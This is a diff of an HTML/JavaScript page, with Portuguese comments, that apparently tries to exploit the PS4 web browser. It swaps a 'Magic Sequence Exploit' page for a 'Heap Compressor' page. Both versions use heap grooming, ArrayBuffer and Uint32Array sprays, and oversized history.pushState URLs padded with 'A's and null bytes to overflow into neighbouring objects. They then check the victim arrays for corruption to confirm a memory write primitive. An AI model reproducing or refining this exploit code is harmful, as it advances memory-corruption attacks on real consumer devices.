@@ -1,128 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Magic Sequence Exploit</title>
+    <title>PS4 Heap Compressor (Stress Test)</title>
     <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap;}
-        .highlight { color: #ffff00; font-weight: bold; }
-        button { padding: 15px; font-size: 1.2em; cursor: pointer; background: #333; color: #fff; border: 1px solid #0f0; }
+        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
+        .win { color: #ffff00; font-weight: bold; background: #222; }
     </style>
 </head>
 <body>
 
-<h1>Protocolo "Magic Sequence" (0x00-0x20)</h1>
-<p>Automação da descoberta: Teste 6 -> Teste 3 -> Exploit Cirúrgico</p>
-
-<button onclick="runProtocol()">INICIAR PROTOCOLO</button>
-<div id="log">Aguardando início...</div>
+<h1>Heap Compressor: Stress & Overwrite</h1>
+<p>Teoria: "Mais Estresse = Mais Bytes Escritos"</p>
+<button onclick="startCompression()">INICIAR COMPRESSÃO MÁXIMA</button>
+<div id="log">Pronto para estressar...</div>
 
 <script>
-    // Configurações baseadas nos seus logs
     const BASE_OFFSET = 709522; 
-    // O Teste 6 foi bem até 46000 bytes. Vamos usar isso para o spray.
-    const SPRAY_SIZE = 46000; 
+    var victims = [];
+    var spray = [];
 
     function log(msg, type='') {
         const el = document.getElementById('log');
-        const color = type === 'err' ? '#ff4444' : (type === 'win' ? '#ffff00' : '#00ff00');
+        const color = type === 'win' ? '#ffff00' : '#00ff00';
         el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         el.scrollTop = el.scrollHeight;
     }
 
     async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    // Cria string segura (apenas 0x01 - 0x20)
-    function makeSafePayload(size) {
-        let s = "";
-        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
-        return s;
-    }
-
-    async function runProtocol() {
-        log("INICIANDO PROTOCOLO MAGIC SEQUENCE...", 'win');
-
-        // PASSO 1: HEAP GROOMING (Baseado no Teste 6)
-        log("[1] Fase de Aquecimento (Incremental)...");
-        try {
-            // Aumenta gradualmente para forçar o GC a organizar a memória
-            for(let size = 1000; size <= 20000; size += 5000) {
-                let payload = "/" + "A".repeat(BASE_OFFSET) + makeSafePayload(size);
-                history.pushState({}, `groom_${size}`, payload);
-                log(`    Grooming: ${size} bytes OK`);
-                await wait(200);
-            }
-        } catch(e) {
-            log(`[!] Erro no Grooming (Isso pode ser bom): ${e.message}`, 'err');
+    async function startCompression() {
+        log("=== FASE 1: AQUECIMENTO DO MOTOR ===");
+        
+        // 1. Fragmentação e Desfragmentação Cíclica
+        // Aloca e desaloca rápido para forçar o GC a trabalhar pesado
+        for(let cycle = 1; cycle <= 3; cycle++) {
+            log(`[Ciclo ${cycle}] Bombeando memória...`);
+            let pump = [];
+            // Enche
+            for(let i=0; i<10000; i++) pump.push(new Uint32Array(1024));
+            await wait(100);
+            // Esvazia
+            pump = [];
+            await wait(200); // Espera GC
         }
 
-        await wait(1000);
+        log("=== FASE 2: PREPARAÇÃO DO SANDUÍCHE ===");
+        // Estrutura: [LIXO] [ALVO] [VÍTIMA] [ALVO] [VÍTIMA] ...
+        // Queremos que o history.pushState caia num [ALVO] e transborde para a [VÍTIMA]
+        
+        log("Alocando vítimas (Canários)...");
+        victims = [];
+        spray = [];
 
-        // PASSO 2: PATTERN SPRAY (Baseado no Teste 3)
-        // Usa caracteres de controle para "amaciar" o heap
-        log("[2] Fase de Padrões (Control Chars)...");
-        try {
-            let controlPayload = "";
-            // Sequência mista de controle
-            for(let i=0; i<5000; i++) controlPayload += "\x00\x09\x0A\x0D\x20";
-            
-            let payload = "/" + "A".repeat(BASE_OFFSET) + controlPayload;
-            history.pushState({}, "pattern_spray", payload);
-            log("    Padrões injetados com sucesso.");
-        } catch(e) {
-            log(`[!] Erro nos Padrões: ${e.message}`, 'err');
+        for(let i=0; i<2000; i++) {
+            // Vítima: Um Array de Inteiros (Uint32Array)
+            // Preenchemos com 0xAABBCCDD para detectar mudanças fáceis
+            let v = new Uint32Array(32); 
+            v.fill(0xAABBCCDD);
+            victims.push(v);
+
+            // Spray: Objetos para ocupar espaço
+            spray.push(new ArrayBuffer(1024));
         }
 
-        await wait(2000); // Pausa crítica para o GC
+        log("=== FASE 3: O ATAQUE DE ESTRESSE ===");
+        log("Tentando escrever o máximo de Zeros possível...");
 
-        // PASSO 3: O ATAQUE CIRÚRGICO (Baseado no Teste 1 Variável)
-        // Agora tentamos escrever APENAS bytes nulos (0x00) no offset crítico.
-        // Se a memória variou entre 0x11 e 0x1C, vamos mirar em sobrescrever
-        // o HEADER do próximo objeto com zeros.
-        
-        log("[3] Fase de Ataque (Null Byte Overwrite)...", 'win');
-        
-        // Tentaremos corromper o Length/Type do vizinho escrevendo zeros
-        // Isso pode transformar um objeto em outro ou mudar seu tamanho
-        const ranges = [16, 17, 18, 28, 29, 32]; // Baseado nos seus logs (0x10, 0x11, 0x1C...)
+        // Vamos tentar escrever de 32 até 100 bytes
+        // Se conseguirmos escrever 64 bytes, chegamos no CONTEÚDO da vítima
+        const sizes = [32, 48, 64, 80, 96, 128];
 
-        for (let range of ranges) {
-            log(`    Tentando range crítico: ${range} bytes...`);
+        for (let size of sizes) {
             try {
-                // Base
-                let buffer = "A".repeat(BASE_OFFSET);
+                // Cria payload de zeros
+                let zeros = "\x00".repeat(size);
                 
-                // O payload aqui é crucial: Tudo 0x00
-                // Se escrevermos 0x00 em cima de um tamanho, podemos criar um objeto "infinito" ou "inválido"
-                let attack = "\x00".repeat(range); 
+                // Base + Zeros
+                let payload = "/" + "A".repeat(BASE_OFFSET) + zeros;
                 
-                history.pushState({}, `attack_${range}`, "/" + buffer + attack);
+                // Nome único para forçar nova entrada
+                history.pushState({}, `compress_${size}`, payload);
                 
-                log(`    [+] SUCESSO! Escrita de ${range} bytes aceita!`, 'win');
-                log(`    VERIFIQUE SE O NAVEGADOR ESTÁ INSTÁVEL AGORA.`);
+                log(`[+] Escrita de ${size} bytes ACEITA pelo navegador!`, 'win');
                 
-                // Se chegamos aqui, sobrescrevemos algo sem crashar.
-                // Hora de testar se causamos corrupção útil.
-                checkStability();
-                
+                // CHECAGEM IMEDIATA
+                checkVictims(size);
+
             } catch(e) {
-                log(`    [-] Crash ou Bloqueio no range ${range}: ${e.message}`, 'err');
+                log(`[-] Limite atingido em ${size} bytes (Crash/Block).`);
             }
-            await wait(1000);
+            
+            // Pausa para não travar a UI
+            await wait(500);
         }
         
-        log("PROTOCOLO FINALIZADO.");
+        log("Teste finalizado.");
     }
 
-    function checkStability() {
-        // Tenta alocar algo simples. Se falhar ou comportar estranho, corrompemos o estado.
-        try {
-            let arr = new Array(100);
-            if (arr.length !== 100) log("    [!!!] CORRUPÇÃO DETECTADA: Array length inválido!", 'win');
-        } catch(e) {
-            log("    [info] Heap instável detectado.", 'win');
+    function checkVictims(attackSize) {
+        let corruptedCount = 0;
+        
+        // Varre as vítimas procurando zeros onde deveria ter 0xAABBCCDD
+        for(let i=0; i<victims.length; i++) {
+            let v = victims[i];
+            
+            // Checa os primeiros elementos
+            // Se o header foi corrompido, acessar 'v[0]' pode crashar ou dar erro, 
+            // então usamos try/catch
+            try {
+                // Se encontrarmos ZEROS no conteúdo, significa que o overflow 
+                // passou pelo header e chegou nos dados!
+                if (v[0] === 0 || v[1] === 0) {
+                    log(`!!! JACKPOT !!! Vítima ${i} corrompida! Conteúdo zerado!`, 'win');
+                    log(`    Isso confirma WRITE PRIMITIVE (Escrita de Memória).`, 'win');
+                    corruptedCount++;
+                }
+                // Se o tamanho do array mudou (Header corrupto)
+                else if (v.length !== 32) {
+                    log(`[!] Header Corrompido: Vítima ${i} tamanho mudou para ${v.length}`, 'win');
+                    corruptedCount++;
+                }
+            } catch(e) {
+                // Se der erro ao ler, também é sinal de header corrompido
+                // log(`[?] Vítima ${i} ilegível (Header destruído?)`);
+            }
+        }
+
+        if (corruptedCount > 0) {
+            alert(`SUCESSO CRÍTICO: ${corruptedCount} objetos corrompidos com ${attackSize} bytes!`);
         }
     }
 </script>
+
 </body>
 </html>
